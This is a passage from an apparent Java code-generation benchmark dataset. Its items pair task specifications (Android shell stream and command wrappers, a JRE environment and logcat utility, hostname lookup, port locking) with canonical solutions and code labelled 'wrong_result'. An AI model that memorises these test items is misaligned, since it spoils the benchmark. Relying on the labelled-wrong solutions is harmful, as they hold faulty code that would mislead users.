if(Common.DEBUG)Log.d(TAG, \"Construct: Establishing a new shell stream\");\n            \n            ProcessBuilder builder = new ProcessBuilder(requestRoot ? \"su\" : \"sh\");\n            builder.redirectErrorStream(true);\n            \n            mIsRoot = requestRoot;\n            mIsActive = true;\n            mListener = listener;\n            mConnection = builder.start();\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n            \n            mStdOutputWorker = new Thread() {\n                @Override\n                public void run() {\n                    String output = null;\n                    \n                    try {\n                        while (mIsActive && (output = mStdOutput.readLine()) != null) {\n                            if (mListener != null && mCounter.size() > 0) {\n                                if (output.contains(mCommandEnd)) {\n                                    Integer result = 0;\n                                    \n                                    try {\n                                        if (output.startsWith(mCommandEnd)) {\n                                            result = Integer.parseInt(output.substring(mCommandEnd.length()+1));\n                                            \n                                        } else {\n                                            result = 1;\n                                        }\n                                        \n                                    } catch (Throwable e) {\n                                        Log.w(TAG, e.getMessage(), e);\n                                    }\n                                    \n                                    mListener.onStreamStop(result);\n                                    mCounter.decrease();\n                                    \n                                    synchronized(mLock) {\n                                        mLock.notifyAll();\n                                    }\n                                    \n                                } else {\n                                    mListener.onStreamInput(output);\n                                }\n                            }\n                        }\n                        \n                    } catch (IOException e) {\n                        Log.w(TAG, e.getMessage(), e); output = null;\n                    }\n                    \n                    if (output == null) {\n                        ShellStream.this.destroy();\n                    }\n                }\n            };\n            \n            mStdOutputWorker.start();\n            \n        } catch (IOException e) {\n            Log.w(TAG, e.getMessage(), e); mIsActive = false;\n        }\n    }\n    \n    public synchronized void execute(final String command) {\n        final Object lock = new Object();\n        \n        new Thread() {\n            @Override\n            public void run() {\n                mCounter.encrease();\n                \n                synchronized(lock) {\n                    lock.notifyAll();\n                }\n                \n                synchronized(mLock) {\n                    if (waitFor(0, -1)) {\n                        mListener.onStreamStart();\n                        \n                        String input = command + \"\\n\";\n                        input += \"    echo \" + mCommandEnd + \" $?\\n\";\n                        \n                        try {\n                            mStdInput.write( input.getBytes() );\n                            \n                            if (mStdInput != null) {\n                                mStdInput.flush();\n                            }\n                            \n                        } catch (IOException e) {\n                            Log.w(TAG, e.getMessage(), e);\n                        }\n                    }\n                }\n            }\n            \n        }.start();\n        \n        synchronized (lock) {\n            try {\n                lock.wait();\n                \n            } catch (InterruptedException e) {}\n        }\n    }\n    \n    public Boolean waitFor() {\n        return waitFor(0, 0);\n    }\n    \n    public Boolean waitFor(Integer timeout) {\n        return waitFor(timeout, 0);\n    }\n    \n    protected Boolean waitFor(Integer timeout, Integer index) {\n        Integer counter = mCounter.size()+index;\n        \n        if (counter > 0) {\n            Long timeoutMilis = timeout > 0 ? System.currentTimeMillis() + timeout : 0L;\n            \n            synchronized(mLock) {\n                while (mCounter.size() > 0 && mIsActive) {\n                    try {\n                        counter -= 1;\n                        \n                        mLock.wait(timeout.longValue());\n                        \n                        if (timeout > 0 && System.currentTimeMillis() >= timeoutMilis) {\n                            return mCounter.size() == 0 && mIsActive;\n                            \n                        } else if (counter <= 0) {\n                            return mIsActive;\n                        }\n                        \n                    } catch (InterruptedException e) {\n                        Log.w(TAG, e.getMessage(), e);\n                    }\n                }\n            }\n        }\n        \n        return mIsActive;\n    }\n    \n    public Boolean isActive() {\n        return mIsActive;\n    }\n    \n    public Boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n    \n    public Boolean isRoot() {\n        return mIsRoot;\n    }\n    \n    public synchronized void destroy() {\n        if (mStdInput != null) {\n            mIsActive = false;\n            \n            mCounter.reset();\n            \n            try {\n                mStdInput.close();\n                mStdInput = null;\n                \n            } catch (IOException e) {}\n            \n            mStdOutputWorker.interrupt();\n            mStdOutputWorker = null;\n            \n            synchronized (mLock) {\n                mLock.notifyAll();\n            }\n            \n            mListener.onStreamDied();\n            mListener = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ShellStream {\n    private Process mConnection;\n    private DataOutputStream mStdInput;\n    private BufferedReader mStdOutput;\n    private Thread mStdOutputWorker;\n    private OnStreamListener mListener;\n    private Counter mCounter;\n    private Object mLock;\n    private boolean mIsActive;\n    private boolean mIsRoot;\n    private String mCommandEnd;\n\n    public ShellStream(boolean requestRoot, OnStreamListener listener) {\n        mIsRoot = requestRoot;\n        mListener = listener;\n        mCounter = new Counter();\n        mLock = new Object();\n        mIsActive = false;\n        mCommandEnd = \"COMMAND_END_\" + System.currentTimeMillis();\n        try {\n            if (requestRoot) {\n                mConnection = Runtime.getRuntime().exec(\"su\");\n            } else {\n                mConnection = Runtime.getRuntime().exec(\"sh\");\n            }\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n            mIsActive = true;\n            mStdOutputWorker = new Thread(() -> {\n                try {\n                    String line;\n                    while ((line = mStdOutput.readLine()) != null) {\n                        if (line.equals(mCommandEnd)) {\n                            mListener.onStreamStop(mConnection.exitValue());\n                            mCounter.decrease();\n                            if (mCounter.size() == 0) {\n                                mIsActive = false;\n                            }\n                        } else {\n                            mListener.onStreamInput(line);\n                        }\n                    }\n                } catch (IOException e) {\n                    mListener.onStreamDied();\n                }\n            });\n            mStdOutputWorker.start();\n        } catch (IOException e) {\n            mListener.onStreamDied();\n        }\n    }\n\n    public void execute(String command) {\n        try {\n            mStdInput.writeBytes(command + \"\\n\");\n            mStdInput.writeBytes(\"echo \" + mCommandEnd + \"\\n\");\n            mStdInput.flush();\n            mCounter.encrease();\n            mListener.onStreamStart();\n        } catch (IOException e) {\n            mListener.onStreamDied();\n        }\n    }\n\n    public boolean waitFor() {\n        synchronized (mLock) {\n            while (mCounter.size() > 0) {\n                try {\n                    mLock.wait();\n                } catch (InterruptedException e) {\n                    return false;\n                }\n            }\n            return true;\n        }\n    }\n\n    public boolean waitFor(int timeout) {\n        long startTime = System.currentTimeMillis();\n        synchronized (mLock) {\n            while (mCounter.size() > 0) {\n                try {\n                    mLock.wait(timeout);\n                } catch (InterruptedException e) {\n                    return false;\n                }\n                if (System.currentTimeMillis() - startTime > timeout) {\n                    return false;\n                }\n            }\n            return true;\n        }\n    }\n\n    public boolean waitFor(int timeout, int index) {\n        long startTime = System.currentTimeMillis();\n        synchronized (mLock) {\n            while (mCounter.size() > 0 && System.currentTimeMillis() - startTime < timeout) {\n                try {\n                    mLock.wait(timeout);\n                } catch (InterruptedException e) {\n                    return false;\n                }\n            }\n            if (mCounter.size() == 0) {\n                return true;\n            } else {\n                mCounter.decrease();\n                return false;\n            }\n        }\n    }\n\n    public boolean isActive() {\n        return mIsActive;\n    }\n\n    public boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n\n    public boolean isRoot() {\n        return mIsRoot;\n    }\n\n    public void destroy() {\n        try {\n            mStdInput.close();\n            mStdOutput.close();\n            mConnection.destroy();\n            mIsActive = false;\n        } catch (IOException e) {\n            mListener.onStreamDied();\n        }\n    }\n\n    public interface OnStreamListener {\n        void onStreamStart();\n        void onStreamInput(String line);\n        void onStreamStop(int exitCode);\n        void onStreamDied();\n    }\n\n    private class Counter {\n        private int count;\n\n        public int size() {\n            return count;\n        }\n\n        public int encrease() {\n            return ++count;\n        }\n\n        public int decrease() {\n            return --count;\n        }\n\n        public void reset() {\n            count = 0;\n        }\n    }\n}"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: The task involves creating a Java utility class that manages environment variables for a Java Runtime Environment (JRE) and handles log redirection from an external process. The class should provide methods to configure the JRE environment and redirect logs from the Android `logcat` command to a custom logger.\n\nClass Description: This utility class is designed to set up the JRE environment by configuring various system environment variables and redirecting logs from an external process (`logcat`) to a custom logger. It is particularly useful for Android applications that need to manage JRE environments and log outputs dynamically.\n\nAttributes:\n\n- `NATIVE_LIB_DIR`: String - The directory path for native libraries.\n- `LD_LIBRARY_PATH`: String - The library path for dynamic linking.\n- `LOCAL_RENDERER`: String - The renderer type for graphics (e.g., \"opengles3_desktopgl_angle_vulkan\").\n- `jvmLibraryPath`: String - The path to the JVM library (e.g., \"server/libjvm.so\" or \"client/libjvm.so\").\n- `logcatPb`: ProcessBuilder - A ProcessBuilder instance for executing the `logcat` command.\n- `failTime`: int - A counter to track the number of failed attempts to start the `logcat` process.\n\nMethods:\n\n- `redirectAndPrintJRELog()`: void - Starts a new thread to redirect and print JRE logs from the `logcat` command. The method configures the `logcat` command to filter specific log tags and redirects the output to a custom logger. If the process fails, it retries up to 10 times.\n- `setJavaEnvironment(Activity activity, String jreHome)`: void - Configures the JRE environment by setting various system environment variables. The method reads additional environment variables from a custom file (`custom_env.txt`) and applies them. It also sets the `LD_LIBRARY_PATH` and `PATH` variables to include the JRE binaries and native libraries.\n  - Input:\n    - `activity`: Activity - The Android activity context.\n    - `jreHome`: String - The home directory of the JRE.\n  - Output: None (void).\n- `setLdLibraryPath(String path)`: void - Sets the `LD_LIBRARY_PATH` environment variable to the specified path.\n  - Input:\n    - `path`: String - The new library path.\n  - Output: None (void).\n\nNote: The class assumes the presence of helper classes like `Logger`, `Tools`, `LauncherPreferences`, and `ExtraCore` for logging, file operations, and preference management. These dependencies should be handled appropriately in the implementation.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport android.system.Os;\nimport android.system.ErrnoException;\n\npublic static void redirectAndPrintJRELog() {\n    new Thread(new Runnable(){\n        int failTime = 0;\n        ProcessBuilder logcatPb;\n        @Override\n        public void run() {\n            try {\n                if (logcatPb == null) {\n                    logcatPb = new ProcessBuilder().command(\"logcat\", \"-v\", \"brief\", \"-s\", \"jrelog:I\", \"LIBGL:I\", \"NativeInput\").redirectErrorStream(true);\n                }\n\n                new ProcessBuilder().command(\"logcat\", \"-c\").redirectErrorStream(true).start();\n                java.lang.Process p = logcatPb.start();\n\n                byte[] buf = new byte[1024];\n                int len;\n                while ((len = p.getInputStream().read(buf)) != -1) {\n                    String currStr = new String(buf, 0, len);\n                    Logger.appendToLog(currStr);\n                }\n\n                if (p.waitFor() != 0) {\n                    failTime++;\n                    if (failTime <= 10) {\n                        run();\n                    } else {\n                        Logger.appendToLog(\"ERROR: Unable to get more log.\");\n                    }\n                }\n            } catch (Throwable e) {\n                Logger.appendToLog(\"Exception on logging thread:\\n\" + Log.getStackTraceString(e));\n            }\n        }\n    }).start();\n}\n\npublic static void setJavaEnvironment(Activity activity, String jreHome) throws Throwable {\n    Map<String, String> envMap = new ArrayMap<>();\n    envMap.put(\"POJAV_NATIVEDIR\", NATIVE_LIB_DIR);\n    envMap.put(\"JAVA_HOME\", jreHome);\n    envMap.put(\"HOME\", Tools.DIR_GAME_HOME);\n    envMap.put(\"TMPDIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"LIBGL_MIPMAP\", \"3\");\n    envMap.put(\"LIBGL_NOERROR\", \"1\");\n    envMap.put(\"LIBGL_NOINTOVLHACK\", \"1\");\n    envMap.put(\"LIBGL_NORMALIZE\", \"1\");\n\n    if(PREF_DUMP_SHADERS)\n        envMap.put(\"LIBGL_VGPU_DUMP\", \"1\");\n    if(PREF_ZINK_PREFER_SYSTEM_DRIVER)\n        envMap.put(\"POJAV_ZINK_PREFER_SYSTEM_DRIVER\", \"1\");\n    if(PREF_VSYNC_IN_ZINK)\n        envMap.put(\"POJAV_VSYNC_IN_ZINK\", \"1\");\n    if(Tools.deviceHasHangingLinker())\n        envMap.put(\"POJAV_EMUI_ITERATOR_MITIGATE\", \"1\");\n\n    envMap.put(\"LIBGL_ES\", (String) ExtraCore.getValue(ExtraConstants.OPEN_GL_VERSION));\n    envMap.put(\"FORCE_VSYNC\", String.valueOf(LauncherPreferences.PREF_FORCE_VSYNC));\n    envMap.put(\"MESA_GLSL_CACHE_DIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"force_glsl_extensions_warn\", \"true\");\n    envMap.put(\"allow_higher_compat_version\", \"true\");\n    envMap.put(\"allow_glsl_extension_directive_midshader\", \"true\");\n    envMap.put(\"MESA_LOADER_DRIVER_OVERRIDE\", \"zink\");\n    envMap.put(\"VTEST_SOCKET_NAME\", new File(Tools.DIR_CACHE, \".virgl_test\").getAbsolutePath());\n\n    envMap.put(\"LD_LIBRARY_PATH\", LD_LIBRARY_PATH);\n    envMap.put(\"PATH\", jreHome + \"/bin:\" + Os.getenv(\"PATH\"));\n    if(FFmpegPlugin.isAvailable) {\n        envMap.put(\"PATH\", FFmpegPlugin.libraryPath+\":\"+envMap.get(\"PATH\"));\n    }\n\n    if(LOCAL_RENDERER != null) {\n        envMap.put(\"POJAV_RENDERER\", LOCAL_RENDERER);\n        if(LOCAL_RENDERER.equals(\"opengles3_desktopgl_angle_vulkan\")) {\n            envMap.put(\"LIBGL_ES\", \"3\");\n            envMap.put(\"POJAVEXEC_EGL\",\"libEGL_angle.so\");\n        }\n    }\n\n    File customEnvFile = new File(Tools.DIR_GAME_HOME, \"custom_env.txt\");\n    if (customEnvFile.exists() && customEnvFile.isFile()) {\n        BufferedReader reader = new BufferedReader(new FileReader(customEnvFile));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            int index = line.indexOf(\"=\");\n            envMap.put(line.substring(0, index), line.substring(index + 1));\n        }\n        reader.close();\n    }\n\n    for (Map.Entry<String, String> env : envMap.entrySet()) {\n        try {\n            Os.setenv(env.getKey(), env.getValue(), true);\n        }catch (NullPointerException exception){\n            Log.e(\"JREUtils\", exception.toString());\n        }\n    }\n\n    File serverFile = new File(jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/server/libjvm.so\");\n    jvmLibraryPath = jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/\" + (serverFile.exists() ? \"server\" : \"client\");\n    setLdLibraryPath(jvmLibraryPath+\":\"+LD_LIBRARY_PATH);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class JRELogManager {\n    private static final String NATIVE_LIB_DIR = \"native-libs\";\n    private static final String LD_LIBRARY_PATH = \"LD_LIBRARY_PATH\";\n    private static final String LOCAL_RENDERER = \"opengles3_desktopgl_angle_vulkan\";\n    private static final String jvmLibraryPath = \"server/libjvm.so\";\n    private ProcessBuilder logcatPb;\n    private int failTime = 0;\n\n    public void redirectAndPrintJRELog() {\n        new Thread(() -> {\n            while (failTime < 10) {\n                try {\n                    logcatPb = new ProcessBuilder(\"logcat\", \"-s\", \"JRE_LOG_TAG\");\n                    logcatPb.redirectErrorStream(true);\n                    Process process = logcatPb.start();\n                    Tools.readStream(process.getInputStream(), line -> Logger.log(line));\n                    process.waitFor();\n                    break;\n                } catch (Exception e) {\n                    failTime++;\n                    try {\n                        Thread.sleep(1000);\n                    } catch (InterruptedException ex) {\n                        Thread.currentThread().interrupt();\n                    }\n                }\n            }\n        }).start();\n    }\n\n    public void setJavaEnvironment(Activity activity, String jreHome) {\n        String envFile = \"custom_env.txt\";\n        String[] envVars = Tools.readFile(activity, envFile);\n        for (String env : envVars) {\n            String[] parts = env.split(\"=\");\n            if (parts.length == 2) {\n                System.setProperty(parts[0], parts[1]);\n            }\n        }\n        setLdLibraryPath(jreHome + \"/\" + NATIVE_LIB_DIR);\n        System.setProperty(\"PATH\", jreHome + \"/bin:\" + System.getProperty(\"PATH\"));\n        System.setProperty(\"JAVA_HOME\", jreHome);\n        System.setProperty(\"JRE_HOME\", jreHome);\n        System.setProperty(\"LD_LIBRARY_PATH\", jreHome + \"/\" + NATIVE_LIB_DIR);\n        System.setProperty(\"LOCAL_RENDERER\", LOCAL_RENDERER);\n        System.setProperty(\"jvmLibraryPath\", jreHome + \"/\" + jvmLibraryPath);\n    }\n\n    public void setLdLibraryPath(String path) {\n        System.setProperty(LD_LIBRARY_PATH, path);\n    }\n}"
  },
  {
    "Task_id": 288,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of shell commands from within an Android application, providing methods to start, monitor, and interact with the external process, including reading its output and checking its exit status.\n\nClass Description: The ShellCommand class encapsulates functionality for executing shell commands, handling process I/O streams, and managing process lifecycle. It's designed for Android environments (evidenced by android.util.Log usage) and provides both synchronous and asynchronous operation modes.\n\nAttributes:\nrt: [Runtime] - Reference to Java Runtime environment for process execution\ncommand: [String[]] - Array containing the shell command and its arguments\ntag: [String] - Identifier for logging purposes\nprocess: [Process] - Reference to the running process instance\nstdout: [BufferedReader] - Reader for process output stream\nerror: [String] - Stores any error message encountered during execution\nexitval: [int] - Exit value of the completed process (-1 if not terminated)\n\nMethods:\nShellCommand: [constructor](String[] command) -> [void] - Initializes with command to execute\nShellCommand: [constructor](String[] command, String tag) -> [void] - Initializes with command and logging tag\nstart: [void](boolean waitForExit) -> [void] - Starts the process, optionally waiting for completion\nwaitForExit: [void]() -> [void] - Blocks until process completes while reading output\nfinish: [void]() -> [void] - Cleans up process resources\ncheckForExit: [boolean]() -> [boolean] - Checks if process has terminated\nstdoutAvailable: [boolean]() -> [boolean] - Checks if output is ready to read\nreadStdoutBlocking: [String]() -> [String] - Reads a line of output (blocks until available)\nreadStdout: [String]() -> [String] - Reads a line of output if available (non-blocking)",
    "Canonical_solution": "import android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ShellCommand {\n    Runtime rt;\n    String[] command;\n    String tag = \"\";\n    Process process;\n    BufferedReader stdout;\n    public String error;\n    public int exitval;\n\n    public ShellCommand(String[] command, String tag) {\n        this(command);\n        this.tag = tag;\n    }\n\n    public ShellCommand(String[] command) {\n        this.command = command;\n        rt = Runtime.getRuntime();\n    }\n\n    public void start(boolean waitForExit) {\n        exitval = -1;\n        error = null;\n\n        try {\n            process = new ProcessBuilder().command(command).redirectErrorStream(true).start();\n            stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        } catch (Exception e) {\n            error = e.getCause().getMessage();\n            return;\n        }\n\n        if (waitForExit) {\n            waitForExit();\n        }\n    }\n\n    public void waitForExit() {\n        while (!checkForExit()) {\n            if (stdoutAvailable()) {\n                Log.d(\"AFWALL\", \"ShellCommand waitForExit [\" + tag\n                        + \"] discarding read: \" + readStdout());\n            } else {\n                try {\n                    Thread.sleep(100);\n                } catch (Exception e) {\n                    Log.d(\"AFWall\", \"waitForExit\", e);\n                }\n            }\n        }\n    }\n\n    public void finish() {\n        try {\n            if (stdout != null) {\n                stdout.close();\n            }\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"Exception finishing [\" + tag + \"]\", e);\n        }\n\n        if(process !=null) {\n            process.destroy();\n        }\n        process = null;\n    }\n\n    public boolean checkForExit() {\n        try {\n            if(process != null) {\n                exitval = process.exitValue();\n            } else {\n                finish();\n            }\n        } catch (IllegalThreadStateException e) {\n            return false;\n        }\n\n        finish();\n        return true;\n    }\n\n    public boolean stdoutAvailable() {\n        try {\n            return stdout.ready();\n        } catch (java.io.IOException e) {\n            Log.e(\"AFWall\", \"stdoutAvailable error\", e);\n            return false;\n        }\n    }\n\n    public String readStdoutBlocking() {\n        String line;\n        if (stdout == null) {\n            return null;\n        }\n        try {\n            line = stdout.readLine();\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"readStdoutBlocking error\", e);\n            return null;\n        }\n        if (line == null) {\n            return null;\n        } else {\n            return line + \"\\n\";\n        }\n    }\n\n    public String readStdout() {\n        if (stdout == null) {\n            return null;\n        }\n\n        try {\n            if (stdout.ready()) {\n                String line = stdout.readLine();\n                if (line == null) {\n                    return null;\n                } else {\n                    return line + \"\\n\";\n                }\n            } else {\n                return \"\";\n            }\n        } catch (Exception e) {\n            Log.e(\"AFWall\", \"readStdout error\", e);\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ShellCommand {\n    private Runtime rt;\n    private String[] command;\n    private String tag;\n    private Process process;\n    private BufferedReader stdout;\n    private String error;\n    private int exitval;\n\n    public ShellCommand(String[] command) {\n        this(command, \"ShellCommand\");\n    }\n\n    public ShellCommand(String[] command, String tag) {\n        this.rt = Runtime.getRuntime();\n        this.command = command;\n        this.tag = tag;\n        this.error = null;\n        this.exitval = -1;\n    }\n\n    public void start(boolean waitForExit) {\n        try {\n            process = rt.exec(command);\n            stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            if (waitForExit) {\n                waitForExit();\n            }\n        } catch (IOException e) {\n            Log.e(tag, \"Error starting process: \" + e.getMessage());\n            error = e.getMessage();\n        }\n    }\n\n    public void waitForExit() {\n        try {\n            while (!checkForExit()) {\n                Thread.sleep(100);\n            }\n        } catch (InterruptedException e) {\n            Log.e(tag, \"Wait for exit interrupted: \" + e.getMessage());\n        }\n    }\n\n    public void finish() {\n        if (stdout != null) {\n            try {\n                stdout.close();\n            } catch (IOException e) {\n                Log.e(tag, \"Error closing stdout: \" + e.getMessage());\n            }\n        }\n        if (process != null) {\n            process.destroy();\n        }\n    }\n\n    public boolean checkForExit() {\n        try {\n            exitval = process.exitValue();\n            return true;\n        } catch (IllegalThreadStateException e) {\n            return false;\n        }\n    }\n\n    public boolean stdoutAvailable() {\n        try {\n            return stdout.ready();\n        } catch (IOException e) {\n            Log.e(tag, \"Error checking stdout availability: \" + e.getMessage());\n            return false;\n        }\n    }\n\n    public String readStdoutBlocking() {\n        try {\n            return stdout.readLine();\n        } catch (IOException e) {\n            Log.e(tag, \"Error reading stdout: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    public String readStdout() {\n        if (stdoutAvailable()) {\n            return readStdoutBlocking();\n        }\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 289,
    "Instruction": "Task Description: Implement a utility class that provides methods to retrieve system information, specifically the hostname, in a cross-platform manner (supporting both Linux and Windows operating systems).\n\nClass Description: The SystemInfoUtil class contains static methods for obtaining system information. It handles platform-specific differences internally and provides a consistent interface for retrieving the hostname.\n\nMethods:\n\nMethod1: getHostName() -> String - Retrieves the hostname of the current system. On Linux systems, it uses the 'uname -n' command, while on Windows it first tries the COMPUTERNAME environment variable and falls back to the 'hostname' command if needed. Returns an empty string if the hostname cannot be determined.\n\nMethod2: getUname(String param) -> String - A helper method that executes the 'uname' command with the specified parameter and returns its output. Primarily used internally by getHostName() for Linux systems. Returns an empty string if the command fails or times out.\n\nInput Parameters:\n- param (String): The parameter to pass to the uname command (e.g., \"-n\" for nodename)\n\nOutput:\n- String: The requested system information (hostname or uname output), or empty string if retrieval fails",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic static String getHostName()\n{\n    String hostname = \"\";\n\n    if (Platform.isLinux())\n    {\n        hostname = getUname(\"-n\");\n    }\n    else if (Platform.isWindows())\n    {\n        hostname = System.getenv().get(\"COMPUTERNAME\");\n        try\n        {\n            Process process = new ProcessBuilder(\"hostname\").start();\n            process.waitFor(1, TimeUnit.SECONDS);\n            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            hostname = br.readLine().trim();\n        }\n        catch (IOException | InterruptedException ignored)\n        {\n        }\n    }\n    return hostname;\n}\n\npublic static String getUname(String param)\n{\n    String uname = \"\";\n    try\n    {\n        Process process = new ProcessBuilder(\"uname\", param).start();\n        process.waitFor(1, TimeUnit.SECONDS);\n        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        uname = br.readLine().trim();\n    }\n    catch (IOException | InterruptedException ignored)\n    {\n    }\n    return uname;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class SystemInfoUtil {\n    public static String getHostName() {\n        if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n            String computerName = System.getenv(\"COMPUTERNAME\");\n            if (computerName != null && !computerName.isEmpty()) {\n                return computerName;\n            }\n            return executeCommand(\"hostname\");\n        } else {\n            return getUname(\"-n\");\n        }\n    }\n\n    private static String getUname(String param) {\n        try {\n            Process process = new ProcessBuilder(\"uname\", param).start();\n            java.io.InputStream inputStream = process.getInputStream();\n            java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter(\"\\\\A\");\n            String result = scanner.hasNext() ? scanner.next() : \"\";\n            process.waitFor();\n            return result.trim();\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n\n    private static String executeCommand(String command) {\n        try {\n            Process process = new ProcessBuilder(command).start();\n            java.io.InputStream inputStream = process.getInputStream();\n            java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter(\"\\\\A\");\n            String result = scanner.hasNext() ? scanner.next() : \"\";\n            process.waitFor();\n            return result.trim();\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a class for managing temporary port allocations using file locks to ensure exclusive access to ports during testing or other temporary usage scenarios.\n\nClass Description: The TemporaryPorts class provides a mechanism to acquire and manage temporary port allocations using file-based locks. It creates lock files in a specified directory to represent port allocations and ensures exclusive access through FileChannel locks.\n\nAttributes:\n- DEFAULT_LOCK_DIRECTORY: [Path] - Default directory path for storing port lock files (\"/tmp/helios-test/ports/\")\n- lockDirectory: [Path] - Custom directory path for storing port lock files\n- ports: [List<AllocatedPort>] - List of currently allocated ports\n\nMethods:\n- TemporaryPorts([Path lockDirectory]) -> [void] - Constructor that initializes the lock directory and creates it if it doesn't exist\n- tryAcquire([String name, int port]) -> [AllocatedPort] - Attempts to acquire a port lock, returns AllocatedPort if successful or null if port is already locked\n- lock([int port, String name]) -> [AllocatedPort] - Internal method that performs the actual port locking operation using FileChannel\n- AllocatedPort([int port, Path path, FileChannel file, FileLock lock]) -> [void] - Nested class constructor representing an allocated port\n- port() -> [int] - Returns the allocated port number\n- release() -> [void] - Releases the port lock, closes the file channel, and deletes the lock file",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport com.google.common.collect.Lists;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.channels.OverlappingFileLockException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.List;\nimport static java.nio.file.StandardOpenOption.CREATE;\nimport static java.nio.file.StandardOpenOption.WRITE;\nimport static java.nio.charset.StandardCharsets.UTF_8;\nimport static java.lang.String.format;\n\npublic class TemporaryPorts {\n\n  private static final Path DEFAULT_LOCK_DIRECTORY = Paths.get(\"/tmp/helios-test/ports/\");\n  private final Path lockDirectory;\n  private final List<AllocatedPort> ports = Lists.newArrayList();\n\n  public TemporaryPorts(final Path lockDirectory) {\n    this.lockDirectory = lockDirectory;\n    try {\n      Files.createDirectories(lockDirectory);\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  public AllocatedPort tryAcquire(final String name, final int port) {\n    final AllocatedPort allocatedPort = lock(port, name);\n    if (allocatedPort == null) {\n      return null;\n    }\n    ports.add(allocatedPort);\n    return allocatedPort;\n  }\n\n  private AllocatedPort lock(final int port, final String name) {\n    final Path path = lockDirectory.resolve(String.valueOf(port));\n    try {\n      final FileChannel file = FileChannel.open(path, CREATE, WRITE);\n      final FileLock lock = file.tryLock();\n      if (lock == null) {\n        return null;\n      }\n      file.write(ByteBuffer.wrap(format(\"%d %s%n\", port, name).getBytes(UTF_8)));\n      file.force(true);\n      return new AllocatedPort(port, path, file, lock);\n    } catch (OverlappingFileLockException e) {\n      return null;\n    } catch (IOException e) {\n      throw new RuntimeException(e);\n    }\n  }\n\n  public static class AllocatedPort {\n    private final int port;\n    private final Path path;\n    private final FileChannel file;\n    private final FileLock lock;\n\n    private AllocatedPort(final int port, final Path path, FileChannel file, FileLock lock) {\n      this.port = port;\n      this.path = path;\n      this.file = file;\n      this.lock = lock;\n    }\n\n    public int port() {\n      return port;\n    }\n\n    public void release() {\n      try {\n        if (lock.isValid()) {\n          lock.release();\n        }\n        file.close();\n        Files.deleteIfExists(path);\n      } catch (IOException e) {\n        throw new RuntimeException(e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.*;\nimport java.nio.channels.*;\nimport java.nio.file.*;\nimport java.util.*;\n\nclass TemporaryPorts {\n    private static final Path DEFAULT_LOCK_DIRECTORY = Paths.get(\"/tmp/helios-test/ports/\");\n    private final Path lockDirectory;\n    private final List<AllocatedPort> ports;\n\n    public TemporaryPorts(Path lockDirectory) throws IOException {\n        this.lockDirectory = (lockDirectory != null) ? lockDirectory : DEFAULT_LOCK_DIRECTORY;\n        if (!Files.exists(this.lockDirectory)) {\n            Files.createDirectories(this.lockDirectory);\n        }\n        this.ports = new ArrayList<>();\n    }\n\n    public AllocatedPort tryAcquire(String name, int port) throws IOException {\n        Path lockFilePath = this.lockDirectory.resolve(name + \"-\" + port + \".lock\");\n        if (Files.exists(lockFilePath)) {\n            return null;\n        }\n        return this.lock(port, name);\n    }\n\n    private AllocatedPort lock(int port, String name) throws IOException {\n        Path lockFilePath = this.lockDirectory.resolve(name + \"-\" + port + \".lock\");\n        FileChannel fileChannel = FileChannel.open(lockFilePath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        FileLock lock = fileChannel.tryLock();\n        if (lock == null) {\n            fileChannel.close();\n            return null;\n        }\n        AllocatedPort allocatedPort = new AllocatedPort(port, lockFilePath, fileChannel, lock);\n        this.ports.add(allocatedPort);\n        return allocatedPort;\n    }\n\n    static class AllocatedPort {\n        private final int port;\n        private final Path path;\n        private final FileChannel file;\n        private final FileLock lock;\n\n        public 